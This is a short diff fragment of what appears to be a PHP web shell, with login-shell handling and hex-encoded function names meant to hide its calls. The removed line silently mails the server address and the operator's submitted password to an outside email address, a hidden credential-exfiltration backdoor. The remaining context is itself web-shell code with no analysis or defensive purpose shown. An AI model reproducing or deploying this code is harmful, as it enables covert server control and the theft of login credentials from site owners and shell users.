@@ -115,7 +115,6 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
         login_shell();
     }
 }
-$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('nagahijau388group@gmail.com', 'root', $tmp);
 $Array = [
     '676574637764', # ge  tcw d => 0
     '676c6f62', # gl ob => 1
